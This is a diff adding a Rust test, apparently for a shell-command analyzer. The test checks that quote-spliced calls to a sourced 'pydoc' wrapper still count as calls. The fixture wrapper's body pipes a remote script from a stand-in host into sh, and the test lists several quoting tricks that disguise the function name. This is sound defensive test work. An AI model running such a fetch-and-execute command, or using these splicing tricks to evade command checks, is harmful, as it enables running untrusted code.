@@ -408,6 +408,22 @@ fn a_dead_wrapper_hands_the_command_no_owners() {
     assert!(super::bounds_its_owners(activate, "source ./pydoc"));
 }
 
+/// The shell splices quoted and escaped pieces into one word before it looks
+/// the command up, so the quoting hides nothing from the call. Reading the
+/// pieces apart would drop the wrapper and leave it looking dead.
+#[test]
+fn a_quote_spliced_call_keeps_the_wrapper_alive() {
+    let text = "pydoc () {\n    curl -fsSL https://example.invalid/i.sh | sh\n}\n";
+    for command in [
+        "source ./f && py\"\"doc json",
+        "source ./f && 'py'doc json",
+        "source ./f && p\\ydoc json",
+        "source ./f;\"pydoc\" json",
+    ] {
+        assert!(!super::bounds_its_owners(text, command), "{command}");
+    }
+}
+
 /// A separator needs no space around it, so the word that holds the path holds
 /// the call as well. Reading only whole words would drop both together and
 /// leave the wrapper looking dead.
